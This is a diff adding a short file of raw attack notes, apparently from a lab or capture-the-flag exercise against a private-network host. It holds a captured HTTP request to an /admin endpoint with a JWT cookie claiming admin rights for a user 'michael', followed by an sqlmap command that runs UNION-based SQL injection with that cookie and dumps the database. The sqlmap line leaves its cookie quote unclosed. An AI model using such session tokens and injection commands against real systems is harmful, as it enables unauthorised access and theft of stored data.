@@ -1,0 +1,11 @@
+GET /admin?user=1 HTTP/1.1
+Host: 10.10.172.172
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2OTI4ODc0ODd9.crSRd2z0cLYxiLYzne0AZfDrb7l8J6OxnIrqTpQp3N4
+Upgrade-Insecure-Requests: 1
+
+sqlmap http://10.10.172.172/admin?user=3 --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2OTI4ODc0ODd9.crSRd2z0cLYxiLYzne0AZfDrb7l8J6OxnIrqTpQp3N4 --technique=U --delay=2 -dump
